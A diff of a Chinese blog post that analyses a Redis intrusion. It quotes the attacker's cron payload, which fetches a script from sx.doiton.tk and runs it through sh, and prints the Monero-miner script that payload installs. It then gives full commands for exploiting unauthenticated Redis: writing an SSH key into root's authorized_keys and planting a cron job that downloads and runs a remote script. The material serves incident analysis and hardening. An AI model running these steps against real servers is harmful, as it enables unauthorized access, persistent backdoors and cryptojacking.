@@ -11,9 +11,9 @@ excerpt:    "最近由于特殊原因，服务器在公网上开放了redis端�
 
 最近由于特殊原因，服务器在公网上开放了redis端口(没有鉴权)和mysql端口，期间胆战心惊的。不过该来的迟早要来，还是被别有用心的人盯上了，现在想来仍心有余悸，背后直冒冷汗。开放在公网没多久，同事就反映redis里面有异常数据，0号db里面数据都被清除了，只剩下个`crackit`键，键值为：
 
-````bash
+```bash
 \n\n*/5 * * * * /usr/bin/curl -fsSL http://sx.doiton.tk/test.sh | sh\n\n
-````
+```
 
 ### 计划任务检查
 
@@ -25,7 +25,7 @@ excerpt:    "最近由于特殊原因，服务器在公网上开放了redis端�
 
 计划任务没有发现什么问题，所以只好去看看入侵者想要下载和执行的脚本，或许能发现什么。下载完脚本，打开之后，内容如下(注释是本人添加)：
 
-````bash
+```bash
 #!/bin/bash
 # 查看系统中是否运行minerd这个挖矿软件
 Jin=`ps -ef|grep minerd|grep -v grep|wc -l`
@@ -60,7 +60,7 @@ if  [ $Jin -ne  1 ];then
     fi
     /opt/minerd -B -a cryptonight -o stratum+tcp://xmr.crypto-pool.fr:80 -u 44GpQ3X9aCR5fMfD8myxKQcAYjkTdT5KrM4NM2rM9yWnEkP28mmXu5URUCxwuvKiVCQPZaoYkpxxzKoCpnED6Gmb2wWJRuN -p x &>>/dev/null
  fi
-````
+```
 
 分析完脚本之后，通过`ps aux | grep -v grep | grep [name]`查看下系统中是否运行有`minerd`或者`AnXqV`。很庆幸，系统中没有运行这两种挖矿软件，估计上一步`计划任务`没添加成功。
 
@@ -80,7 +80,7 @@ if  [ $Jin -ne  1 ];then
 
 公网上有很多用户运行redis，其实都监听默认端口6379，并且没有开启auth鉴权。我们可以很轻松的扫描到这样的用户，然后实施入侵(并不建议这么做，已经是犯罪)：
 
-````bash
+```bash
 # 安装nmap扫描器
 $ sudo yum install nmap (红帽系或者SUSE) 或者 sudo apt-get install nmap (debian系)
 
@@ -98,7 +98,7 @@ $ nmap -sC 192.168.2.22 -p 6379
 
 # 特定漏洞脚本利用(这个不是重点)
 $ nmap --script=[path] 192.168.2.22 -p 6379
-````
+```
 
 扫描到可利用的端口后，我们就可以进行下一步操作了。我们可以进行比较常见的操作：添加计划任务执行特定操作，或者将ssh公钥添加到主机方便以后利用。
 
@@ -106,24 +106,24 @@ $ nmap --script=[path] 192.168.2.22 -p 6379
 
 在主机redis中添加一个`crackit`的键值对
 
-````bash
+```bash
 # 生成rsa密钥对(公钥和私钥)
 $ ssh-keygen -t rsa
 # 将公钥写入文件，私钥保留
 $ (echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > test.txt
 # 将公钥写入redis
 $ cat test.txt | redis-cli -h 192.168.2.22 -x set "crackit"
-````
+```
 
 通过`config`命令，修改配置路径，将公钥写入主机`/root/.ssh/authorized_keys`。
 
-````bash
+```bash
 $ redis-cli -h 192.168.2.22
     > flushall
     > config set dir "/root/.ssh"
     > config set dbfilename "authorized_keys"
     > save
-````
+```
 
 公钥写入成功之后，我们便可以使用之前生成的私钥来访问对应的主机，后面的操作自己脑补。
 
@@ -131,22 +131,22 @@ $ redis-cli -h 192.168.2.22
 
 在主机redis中添加一个`crackit`的键值对
 
-````bash
+```bash
 # 将计划任务命令写入文件
 $ (echo -e "\n\n*/5 * * * * /usr/bin/curl -fsSL http://192.168.2.1/test.sh | sh\n\n") > test.txt
 # 将计划任务内容写入redis
 $ cat test.txt | redis-cli -h 192.168.2.22 -x set "crackit"
-````
+```
 
 添加任务计划操作，其实和添加公钥差不多，只是将目录修改成`/var/spool/cron/`，系统中便自动添加了一个计划任务。
 
-````
+```bash
 $ redis-cli -h 192.168.2.22
     > flushall
     > config set dir "/var/spool/cron/"
     > config set dbfilename "root"
     > save
-````
+```
 
 添加计划任务成功以后，系统便会定时运行我们写好的脚本，具体能做什么取决于你的脚本内容。
 
